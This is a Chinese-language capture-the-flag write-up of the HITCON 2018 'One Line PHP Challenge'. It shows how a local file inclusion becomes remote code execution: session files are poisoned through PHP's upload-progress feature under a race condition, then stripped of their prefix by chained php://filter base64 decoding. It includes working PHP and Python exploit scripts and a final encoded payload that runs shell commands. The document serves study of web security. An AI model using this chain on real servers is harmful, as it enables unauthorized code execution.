---
title: hitcon2018 One Line PHP Challenge
date: 2018-10-24 14:25:40
tags:
	- writeup
---

# 前言

膜orange，质量相当高的题目。

# 整理思路

题目相当简单，就一句话

```php
($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ? include($_) : highlight_file(__FILE__);
```

可以看到需要一个文件以`@<?php`开头的文件，然后就可以进行文件包含。

环境以及配置都是默认的`Ubuntu18.04+Apache2+PHP7.2`

不考虑0day的情况下。这里文件名是可以完全控制的，就需要想到各种协议流以及php的伪协议。

这样，或许可以利用伪协议的方式来控制文件头。然后就是寻找我们可以控制的文件。

php里默认可以由用户控制的文件就只有几个

- 临时上传文件
- session文件

临时上传文件由`/tmp/php[a-zA-z0-9]{6}`形式组成，在有phpinfo页面的时候可以进行文件包含

https://www.kingkk.com/2018/07/phpinfo-with-LFI/

这里显然没有这个phpinfo页面，暴力破解的可能性约等于零。

然后就是session文件，这里没有开启session，也没有可以控制的session字段。

所以session文件也是无法控制的（对不起，是我不可以，但是orange可以

# session.upload

之前N1ctf的时候出现过的一个非预期解

https://xz.aliyun.com/t/2148#toc-2

在phpinfo中有几个配置

![](hitcon2018-One-Line-PHP-Challenge\1.png)

这个配置是在默认情况下开启的。

他的出现本是为了显示文件在上传时候的进度，以显示文件上传的信息。

这个信息是保存在用户的`$_SESSION`中的，而session则是以文件的形式保存在默认的路径下的。

可以看到默认的文件路径是`/var/lib/php/sessions`

![](hitcon2018-One-Line-PHP-Challenge\2.png)

  

这里有个小trick就是，这个session文件并不一定要`session_start`才能生成，只要往服务器发送一个`Cookie: PHPSESSID=xxx`的值，然后用session upload的方式进行上传文件，就会生成这样一个session文件

由于文件上传的速度比较快，有时候经常来不及看到保存在session文件中的upload信息，就会被删除。我们可以上传一个相对比较大的文件，并且条件竞争的方式，来先看一下保存在session中的文件内容。

这里构造了一个这样的表单，upload.php

```php
<form action="upload.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />
 <input type="file" name="file1" />
 <input type="file" name="file2" />
 <input type="submit" />
</form>
<?php
session_start();
$name = ini_get('session.upload_progress.name');
$key = ini_get('session.upload_progress.prefix') . $_POST[$name];
var_dump($_SESSION[$key]); 
include '/var/lib/php/sessions/sess_kingkk';
```

加上任意的`PHPSESSID`，上传两个相对稍大的文件，这里http报文长度有61W

![](hitcon2018-One-Line-PHP-Challenge\3.png)

然后开个多线程跑几次，就能看到有些通过条件竞争，输出了还未被删除的`session`信息

`$_SERVER[ini_get('session.upload_progress.prefix') . $_POST[ini_get('session.upload_progress.name')]]`中保存了一些上传过程中的信息

![](hitcon2018-One-Line-PHP-Challenge\4.png)

以及session文件中的内容，可以看到就是反序列化的upload信息

![](hitcon2018-One-Line-PHP-Challenge\5.png)

对应目录下也确实生成了这个session文件，但是内容却是空的，因为文件上传完成后，会默认清除其中的内容。

![](hitcon2018-One-Line-PHP-Challenge\6.png)

  

可以看到`sess_kingkk`中有不少值是可以通过改变传入的参数进行控制的，比如文件名、`PHP_SESSION_UPLOAD_PROGRESS`的值。从而只要插入对应的php代码，在存在文件包含的时候，就可以getshell

这里修改了文件名为php代码，再利用一个文件包含的页面包含这个session文件

![](hitcon2018-One-Line-PHP-Challenge\7.png)

可以看到成功getshell

![](hitcon2018-One-Line-PHP-Challenge\8.png)

# 重新认识base64

接下来还有一个条件就是

```php
substr(file($_)[0],0,6) === '@<?php' 
```

但是观察之前的session信息，可以发现，文件是以`upload_progress_`开始，最多控制其后的`123`部分

这时候能想到的就是利用php中的一些伪协议，进行文件内容的修改。这个思路p神的blog中也有写到过

https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1

就是利用`php://filter/write=convert.base64-decode/resource`的方式绕过死亡exit.

这里需要一些base64的前置知识

> base64编码后的字符串集为[0-9a-zA-Z+/=]
>
> 因而在解码的时候遇到这个之外的字符，就会跳过那些字符。只对在此范围内的字符进行解码。

所以只要对前面的`upload_progress_`进行足够多次的解密，就可以使其变成空字符

```php
$i = 0 ;
$data = "upload_progress_";
while(true){
    $i += 1;
    $data = base64_decode($data); 
    var_dump($data);
    if($data == ''){
        echo "一共解码了:".$i,"次\n";
        break;
    }
}
```

![](hitcon2018-One-Line-PHP-Challenge\9.png)

通过脚本可以看到，只要三次就可以将前面的内容转换为成空。

可是事情似乎没有那么简单。由于base64是对四个字符为一组进行解码。`upload_progress_`并不满足三次解码后允许字符是4的倍数，就会把后面的字符算入填充，从而破坏原有传入的php代码

例如

```php
function triple_base64_encode($str){
	return base64_encode(base64_encode(base64_encode($str)));
}
function triple_base64_decode($str){
	return base64_decode(base64_decode(base64_decode($str)));
}
$i = 0 ;
$data = "upload_progress_".triple_base64_encode("<?=\`id\`;>");

echo triple_base64_decode($data);
```

解码之后的数据是`?`

然而解密`"upload_progress_ZZ".triple_base64_encode("<?=\`id\`;>")`解码之后就是`<?=\`id\`;>`

就是由于`upload_progress_ZZ`在三次的解码中，第一次解码后留下了四个允许字符`hikY`，第二次解码没有允许字符，第三次就变成了空。

![](hitcon2018-One-Line-PHP-Challenge\10.png)

在这三次中，都是允许字符的数量都是4的倍数，这样就不会破坏后面传入的php代码。

队友写的一个脚本

```php
<?php

$str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
while(true) {
	$i = 0 ;
	$data = "upload_progress_".substr(str_shuffle($str),10,2);
	$s = base64_decode($data);
	$s_length = strlen(preg_replace('|[^a-z0-9A-Z+/]|s', '', $s));
	$ss = base64_decode($s);
	$ss_length = strlen(preg_replace('|[^a-z0-9A-Z+/]|s', '', $ss));
	$sss = base64_decode($ss);
	if($s_length%4==0 && $ss_length%4==0 && $sss=='') {
		echo $data;
		break;
	}
}
```



  

对于后面的php代码，也有一个要求，就是三次解密中都不能出现`=`，因为base64中`=`只能放在编码的最后补位，出现在中间的话，`php://filter/convert.base64-decode`流就无法正常解析，就会报错。

对此oragne师傅写了个脚本生成这玩意

```python
import string
from base64 import b64encode
from random import sample, randint

payload = '@<?php echo `id`;?>'

while 1:
    junk = ''.join(sample(string.ascii_letters, randint(8, 16)))
    x = b64encode(payload + junk)
    xx = b64encode(b64encode(payload + junk))
    xxx = b64encode(b64encode(b64encode(payload + junk)))
    if '=' not in x and '=' not in xx and '=' not in xxx:
        print xxx
        break
```

```
VVVSM0wyTkhhSGRKUjFacVlVYzRaMWxIYkd0WlJITXZVRzVvZFdFeFZuUlZSVTVw
```

![](hitcon2018-One-Line-PHP-Challenge\11.png)

成功getshell

![](hitcon2018-One-Line-PHP-Challenge\12.png)



# 最后

学到的东西相当多了。膜orange

顺带说一句，貌似php中的`base64_decode`类似于网上的一些在线脚本之类的解密，会对数据进行一些优化，直观的感受就是，用解密一些省略了`=`的字符也可以顺利解密，然而用hackbar之类的工具就会直接返回空。

php伪协议中的`php://filter/convert.base64-decode`类似于hackbar这种，对数据校验较为严格，所以有时候用php的`base_64decode`之后发现是可见字符，可实际包含的时候却会报错。

# Reference



http://wonderkun.cc/index.html/?p=718

https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge

https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1